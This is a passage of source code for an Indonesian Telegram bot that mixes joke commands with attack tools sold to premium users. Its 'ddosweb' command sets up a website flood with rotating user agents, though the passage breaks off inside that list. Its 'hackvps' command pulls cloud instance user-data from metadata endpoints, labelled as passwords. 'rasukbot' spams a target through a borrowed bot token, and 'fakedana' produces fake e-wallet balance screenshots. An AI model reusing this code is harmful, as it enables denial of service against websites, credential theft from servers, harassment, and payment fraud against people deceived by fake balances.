• *fakedanav2* ➜ Tampilan aplikasi Dana (portrait)`

            return ctx.reply(example, { parse_mode: "Markdown" })
        }

        const wait = await ctx.reply("⏳ Membuat gambar...")

        const nominal = encodeURIComponent(text)

        const endpoint =
        cmd === "fakedanav2"
        ? `https://api.zenzxz.my.id/maker/fakedanav2?nominal=${nominal}`
        : `https://api.zenzxz.my.id/maker/fakedana?nominal=${nominal}`

        const res = await fetch(endpoint)

        if (!res.ok) throw new Error("API Error")

        const buffer = Buffer.from(await res.arrayBuffer())

        await ctx.replyWithPhoto({ source: buffer })

        await ctx.telegram.editMessageText(
            ctx.chat.id,
            wait.message_id,
            null,
            "✅ Berhasil membuat Fake Dana"
        )

    } catch (e) {

        console.error(e)

        ctx.reply(`🍂 *Gagal membuat gambar Fake Dana.*

Kemungkinan penyebab:
• API sedang bermasalah
• Nominal tidak valid
• Server tidak merespon`,
        { parse_mode: "Markdown" })

    }
})

bot.command("fakedanav2", async (ctx) => {
    try {

        const cmd = ctx.message.text.split(" ")[0].replace("/", "").toLowerCase()
        const text = ctx.message.text.split(" ").slice(1).join(" ")

        if (!text) {

            const example = cmd === "fakedanav2"
            ? `*Fake Dana Generator*

Example:

➜ /fakedanav2 1.000.000
➜ /fakedana 5.000.000

Perbedaan versi:
• *fakedana* ➜ Tampilan saldo Dana (landscape)
• *fakedanav2* ➜ Tampilan aplikasi Dana (portrait)`
            : `*Fake Dana Generator*

Example:

➜ /fakedana 1.000.000
➜ /fakedanav2 5.000.000

Perbedaan versi:
• *fakedana* ➜ Tampilan saldo Dana (landscape)
• *fakedanav2* ➜ Tampilan aplikasi Dana (portrait)`

            return ctx.reply(example, { parse_mode: "Markdown" })
        }

        const wait = await ctx.reply("⏳ Membuat gambar...")

        const nominal = encodeURIComponent(text)

        const endpoint =
        cmd === "fakedanav2"
        ? `https://api.zenzxz.my.id/maker/fakedanav2?nominal=${nominal}`
        : `https://api.zenzxz.my.id/maker/fakedana?nominal=${nominal}`

        const res = await fetch(endpoint)

        if (!res.ok) throw new Error("API Error")

        const buffer = Buffer.from(await res.arrayBuffer())

        await ctx.replyWithPhoto({ source: buffer })

        await ctx.telegram.editMessageText(
            ctx.chat.id,
            wait.message_id,
            null,
            "✅ Berhasil membuat Fake Dana"
        )

    } catch (e) {

        console.error(e)

        ctx.reply(`🍂 *Gagal membuat gambar Fake Dana.*

Kemungkinan penyebab:
• API sedang bermasalah
• Nominal tidak valid
• Server tidak merespon`,
        { parse_mode: "Markdown" })

    }
})
bot.command('cekfuncv3', async (ctx) => {
  const reply = ctx.message.reply_to_message;

  if (!reply || !reply.text) {
    return ctx.reply("⚠️ Balas kode yang mau dicek dulu!", {
      parse_mode: "Markdown"
    });
  }

  let code = reply.text.replace(/\u0000/g, ""); // 🔥 hapus char aneh
  const lines = code.split("\n");

  try {
    new vm.Script(code);

    return ctx.reply(`
╭━━━〔 🧪 CEK FUNCTION V3 〕━━━⬣
┃ ✅ KODE VALID
┃ Tidak ditemukan syntax error
╰━━━━━━━━━━━━━━━━━━⬣
`, {
      parse_mode: "Markdown"
    });

  } catch (err) {
    const errorMsg = err.message;

    // =========================
    // 🔥 DETECT LINE (FIX TOTAL)
    // =========================
    let lineNumber = null;
    let columnNumber = null;

    const stackMatch = err.stack && err.stack.match(/<anonymous>:(\d+):(\d+)/);

    if (stackMatch) {
      lineNumber = parseInt(stackMatch[1]);
      columnNumber = parseInt(stackMatch[2]);
    } else {
      // fallback manual scan
      for (let i = 0; i < lines.length; i++) {
        try {
          new vm.Script(lines[i]);
        } catch {
          lineNumber = i + 1;
          columnNumber = 1;
          break;
        }
      }
    }

    // =========================
    // SNIPPET BUILDER
    // =========================
    let snippet = "_Tidak bisa mendeteksi baris_";

    if (lineNumber && lines[lineNumber - 1]) {
      const start = Math.max(0, lineNumber - 2);
      const end = Math.min(lines.length, lineNumber + 1);

      let context = "";

      for (let i = start; i < end; i++) {
        const line = escapeMarkdown(lines[i]);
        const lineIndex = i + 1;

        if (lineIndex === lineNumber) {
          context += `➤ ${lineIndex} │ ${line}\n`;

          if (columnNumber) {
            context += "   " + " ".repeat(columnNumber - 1) + "↑\n";
          }

        } else {
          context += `  ${lineIndex} │ ${line}\n`;
        }
      }

      snippet = "```\n" + context + "```";
    }

    // =========================
    // FINAL OUTPUT
    // =========================
    return ctx.reply(`<blockquote><strong>╭━━━〔 🧪 CEK FUNCTION V3 〕━━━⬣
┃ ❌ ERROR TERDETEKSI
┃ 💥 \`${escapeMarkdown(errorMsg)}\`
┃ 📍 Line ${lineNumber || "?"}:${columnNumber || "?"}
┣━━━━━━━━━━━━━━━━━━⬣
┃ 📌 Cuplikan:
┃${snippet}
┣━━━━━━━━━━━━━━━━━━⬣
┃ 🛠 Suggestion:
┃ • Cek syntax
┃ • Perbaiki penulisan variable
┃ • Pastikan tanda kurung benar
╰━━━━━━━━━━━━━━━━━━⬣</strong></blockquote>
`, {
      parse_mode: "HTML"
    });
  }
});
bot.command('cekfuncv2', async (ctx) => {
  let code = await extractCode(ctx);
  if (!code) code = ctx.message.text.split(' ').slice(1).join(' ');
  if (!code) return ctx.reply("⚠️ Kirim kode atau reply file .js");

  const issues = analyzeAST(code);
  if (issues.length === 0) {
    return ctx.reply("✅ KODE AMAN — TIDAK ADA ERROR", { parse_mode: "Markdown" });
  }

  lastPayload.set(ctx.from.id, {
    code,
    fileName: ctx.message.reply_to_message?.document?.file_name || 'fix.js'
  });

  await ctx.reply(
`❌ ERROR TERDETEKSI

${issues.map(i => `• ${i.msg} (baris ${i.line})`).join('\n')}`,
    Markup.inlineKeyboard([
      [Markup.button.callback("🛠 FIX AUTOMATICALLY", "fixfunc")]
    ])
  );
});

/* ================= FIXFUNC ================= */
bot.action('fixfunc', async (ctx) => {

  const payload = lastPayload.get(ctx.from.id);
  if (!payload) return ctx.answerCbQuery("Data tidak ditemukan");

  const fixed = autoFix(payload.code);
  const outName = `fix-${payload.fileName}`;

  fs.writeFileSync(
    outName,
`// AUTO FIX FUNC BY BOT VIPER INVICTUS

${fixed}`
  );

  await ctx.replyWithDocument({ source: outName });
  await ctx.answerCbQuery("✅ FIX TERKIRIM");
});

bot.command("rasukbot", checkOwner, async (ctx) => {
  const chatId = ctx.chat.id;
  const text = ctx.message.text;
  const input = text.split(" ").slice(1).join(" ").trim();
  const reply = ctx.message.reply_to_message;

  // Jika hanya /rasukbot
  if (!input) {
    return ctx.replyWithHTML(
      "📘 <b>Cara penggunaan /rasukbot</b>\n\n" +
      "🟢 <b>1. Kirim langsung (tanpa reply)</b>\n" +
      "Gunakan format:\n<code>/rasukbot token|id|pesan|jumlah</code>\n\n" +
      "Contoh:\n<code>/rasukbot 123456:ABCDEF|987654321|Halo bro|5</code>\n\n" +
      "🔵 <b>2. Balas pesan target</b>\n" +
      "Balas pesan orangnya, lalu ketik:\n<code>/rasukbot token|pesan|jumlah</code>\n\n" +
      "Contoh:\n<code>/rasukbot 123456:ABCDEF|Halo|3</code>"
    );
  }

  try {
    let token, targetId, pesan, jumlah;

    // MODE REPLY
    if (reply) {
      const parts = input.split("|").map(v => v.trim());
      if (parts.length < 3) {
        return ctx.replyWithHTML(
          "❌ Format salah!\nGunakan:\n<code>/rasukbot token|pesan|jumlah</code> (reply pesan target)"
        );
      }

      [token, pesan, jumlah] = parts;
      targetId = reply.from.id;
      jumlah = parseInt(jumlah);

    } else {
      // MODE MANUAL
      const parts = input.split("|").map(v => v.trim());
      if (parts.length < 4) {
        return ctx.replyWithHTML(
          "❌ Format salah!\nGunakan:\n<code>/rasukbot token|id|pesan|jumlah</code>"
        );
      }

      [token, targetId, pesan, jumlah] = parts;
      jumlah = parseInt(jumlah);
    }

    if (!token || !targetId || !pesan || isNaN(jumlah)) {
      return ctx.replyWithHTML(
        "❌ Format tidak valid!\nGunakan:\n<code>/rasukbot token|id|pesan|jumlah</code>"
      );
    }

    await ctx.reply("🚀 Mengirim pesan...");

    for (let i = 0; i < jumlah; i++) {
      await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
        chat_id: targetId,
        text: pesan
      });
    }

    await ctx.replyWithHTML(
      `✅ Berhasil mengirim ${jumlah} pesan ke ID <code>${targetId}</code>`
    );

  } catch (err) {
    await ctx.replyWithHTML(
      `❌ Gagal mengirim pesan:\n<code>${err.message}</code>`
    );
  }
});
  const quotes = [
    "Aku rela jadi yang kedua, asal kamu bahagia.",
    "Kamu tahu nggak? Kamu itu alasanku buka mata tiap pagi.",
    "Kalau cinta butuh pengorbanan, aku rela disakiti.",
    "Aku bukan yang terbaik, tapi aku akan berusaha jadi yang paling setia.",
    "Sayang, jangan pergi. Aku belum selesai mencintaimu.",
    "Kamu adalah alasan aku selalu tersenyum tiap hari.",
    "Cintaku kayak utang negara, nggak akan lunas sampai kapanpun.",
    "Kalau kamu bahagia sama dia, aku rela mundur walau hati hancur.",
    "Kalau cinta itu bodoh, maka aku bangga jadi yang paling bodoh.",
    "Cinta sejati itu bukan yang datang pertama, tapi yang bertahan sampai akhir.",
    "Setiap detik tanpamu itu siksaan.",
    "Aku ingin jadi alasan kamu bahagia, bukan alasan kamu terluka.",
    "Aku bucin karena kamu, bukan karena siapa-siapa.",
    "Kalau sayang bilang, jangan disimpan dalam diam.",
    "Jangan lelah mencintaiku, aku sedang belajar memperbaiki diri untukmu."
  ];
  bot.command("bucin", (ctx) => {
    const random = quotes[Math.floor(Math.random() * quotes.length)];
    ctx.reply(`💘 ${random}`);
  });

  const teks = [
    "Kadang, yang setia malah disia-siakan.",
    "Aku tersenyum, padahal hatiku hancur.",
    "Cinta tak selamanya indah, kadang menyakitkan.",
    "Aku rindu, tapi aku sadar aku bukan siapa-siapa.",
    "Jangan tanya kenapa aku diam, karena aku sudah lelah.",
    "Dulu kita dekat, sekarang hanya sisa kenangan.",
    "Aku mencintaimu, tapi kamu mencintainya.",
    "Kamu bahagia tanpaku, dan itu yang membuatku lebih sakit.",
    "Aku bertahan karena cinta, bukan karena tidak bisa pergi.",
    "Mereka bilang sabar, tapi hatiku sudah berdarah-darah.",
    "Terkadang, aku berharap tak pernah mengenalmu.",
    "Aku takut jatuh cinta lagi, karena sakitnya belum sembuh.",
    "Kamu ajari aku bahagia, lalu kamu pergi tinggalkan luka.",
    "Katanya cinta itu indah, kenapa aku selalu terluka?",
    "Aku sudah cukup kuat... sampai kamu datang lagi dengan luka baru."
  ];
  bot.command("sadboy", (ctx) => {
    ctx.reply(`😢 ${teks[Math.floor(Math.random() * teks.length)]}`);
  });
bot.command("gaymeter", (ctx) => {
    const percent = Math.floor(Math.random() * 101);
    ctx.reply(`🌈 Gaymeter kamu: ${percent}%`);
  }); 
  const kalimat = [
    "👻 Kamu merasa ada yang mengawasimu...",
    "😱 Bayangan hitam muncul di pojok ruangan.",
    "💀 Terdengar suara menyeramkan: 'Kembalikan bonekaku...'",
    "🕯️ Lilin tiba-tiba padam dan suhu menjadi dingin.",
    "🔪 Sosok putih berdiri di depan cermin.",
    "📞 Telepon berdering, tapi tak ada suara saat diangkat.",
    "📺 TV menyala sendiri dengan suara statik keras.",
    "🚪 Pintu kamar bergoyang sendiri di tengah malam.",
    "🩸 Ada jejak kaki basah padahal lantai kering.",
    "🪞 Cermin retak tanpa sebab, ada tulisan 'I see you'.",
    "🕳️ Kamu mendengar bisikan di telingamu.",
    "🩻 Tiba-tiba jantungmu berdetak cepat, entah kenapa.",
    "📸 Kamera menangkap sosok bayangan di belakangmu.",
    "📷 Foto lama berubah sendiri, ada sosok baru muncul.",
    "⛓️ Rantai besi berbunyi seperti diseret... semakin dekat."
  ];
  bot.command("ghost", (ctx) => {
    const hasil = kalimat[Math.floor(Math.random() * kalimat.length)];
    ctx.reply(hasil);
  });
bot.command('hackvps', checkPremium, async (ctx) => {
    
    const userId = ctx.from.id.toString();

    await ctx.reply("🔍 Memulai pemindaian metadata VPS... Mohon tunggu.");

    // Helper fetch sesuai struktur asli
    const tryFetch = async (url, headers = {}) => {
        const ctrl = new AbortController();
        const t = setTimeout(() => ctrl.abort(), 2000); // Timeout 2 detik
        try {
            const res = await fetch(url, { headers, signal: ctrl.signal });
            if (!res.ok) return null;
            return await res.text();
        } catch {
            return null;
        } finally {
            clearTimeout(t);
        }
    };

    let provider = 'Unknown';
    let userData = null;

    // --- LOGIKA PENCARIAN PASSWORD (USERDATA) ---

    // 1. DigitalOcean
    const doMeta = await tryFetch('http://169.254.169.254/metadata/v1.json', { Accept: 'application/json' });
    if (doMeta) {
        provider = 'DigitalOcean';
        try { userData = JSON.parse(doMeta).user_data ?? null; } catch {}
    }

    // 2. AWS
    if (!userData) {
        const aws = await tryFetch('http://169.254.169.254/latest/user-data');
        if (aws) { provider = 'AWS'; userData = aws; }
    }

    // 3. GCP
    if (!userData) {
        const gcp = await tryFetch(
            'http://metadata.google.internal/computeMetadata/v1/instance/attributes/user-data',
            { 'Metadata-Flavor': 'Google' }
        );
        if (gcp) { provider = 'GCP'; userData = gcp; }
    }

    // 4. Linode
    if (!userData) {
        const linode = await tryFetch('http://169.254.169.254/metadata/v1/user-data');
        if (linode) { provider = 'Linode'; userData = linode; }
    }

    // 5. Vultr
    if (!userData) {
        const vultr = await tryFetch('http://169.254.169.254/v1/user-data');
        if (vultr) { provider = 'Vultr'; userData = vultr; }
    }

    // 6. IPv4 Publik (Cek IP)
    let ip = 'N/A';
    try {
        const r = await fetch('https://ifconfig.me/ip');
        if (r.ok) ip = (await r.text()).trim();
    } catch {}

    // --- OUTPUT HASIL KE TELEGRAM ---
    let teksHasil = `<b>🚀 VPS INFO REPORT (WORK 100%)</b>\n`;
    teksHasil += `━━━━━━━━━━━━━━━━━━━━\n`;
    teksHasil += `<b>📍 Provider  :</b> <code>${provider}</code>\n`;
    teksHasil += `<b>🌐 Public IP :</b> <code>${ip}</code>\n`;
    teksHasil += `━━━━━━━━━━━━━━━━━━━━\n`;
    teksHasil += `<b>🔑 PASSWORD / USERDATA :</b>\n\n`;
    
    if (userData) {
        teksHasil += `<pre>${userData}</pre>`;
    } else {
        teksHasil += `<i>(Empty: Password tidak disimpan di Metadata Server ini)</i>`;
    }

    await ctx.reply(teksHasil, { parse_mode: 'HTML' });
});
    
 const uap = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0"
];

const cplist = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-RSA-AES256-GCM-SHA384"
];

bot.command("ddosweb", checkPremium, async (ctx) => {
    try {
    const userId = ctx.from.id.toString();

        const argsText = ctx.message.text.split(" ").slice(1).join(" ").trim();
        if (!argsText) {
            return ctx.reply("🪧 ☇ Format: /ddosweb https://target.com 1000");
        }

        const [target_url, rawThreads] = argsText.split(" ");
        const threads = parseInt(rawThreads) || 50;

        // Pesan Awal (HTML style sesuai permintaan)
        const processMsg = await ctx.reply(`<blockquote><strong>
⬡═―—⊱ ⎧ 『 Vïðñïx Inv¡cťús 』⊰―—═⬡
✧ - Target
☇ - ${target_url}
✧ - Threads
☇ - ${threads}
✧ - Status
☇ - Process
</strong></blockquote>`, { parse_mode: "HTML" });

        const attackConfig = {
            threads: threads,
            duration: 60000,
            requestsPerThread: 1000,
            userAgents: [
                'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)',
    'Mozilla/5.0 (iPad; CPU OS 14_4_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.66 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6,2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.77 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/231.0.475926209 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/107.0.1418.36 Version/15.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148  CSDNApp/5.11.1(iOS)',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/236.0.484392333 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.66 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6,2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/106.0.5249.92 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.66 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/93.0.4577.78 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/106.1  Mobile/15E148 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)  Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.66 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) EdgiOS/107.0.1418.42 Version/16.0 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) GSA/180.0.400278405 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [LinkedInApp]/9.25.434',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/107.0.5304.101 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPhone; CPU OS 11_0 like Mac OS X) AppleWebKit/604.1.25 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10; A20S PRO) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; CLT-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; CLT-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; CPH2239) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; ELE-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; LYA-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; moto g(7) power) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; moto g(7)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; moto g(8) play) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.115 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; moto g(8) plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; ONEPLUS A5010) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; POCO F1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; POCOPHONE F1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; RMX2020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-T510) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.126 Safari/537.36 OPR/72.3.3767.68685',
    'Mozilla/5.0 (Linux; Android 10; TECNO KE6j) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.0 Chrome/87.0.4280.141 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; TECNO KE7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; VOG-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; YAL-L21; HMSCore 6.8.0.312; GMSCore 22.44.17) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.3.304 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; 21061119AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; 2201117TI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; BE2029) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
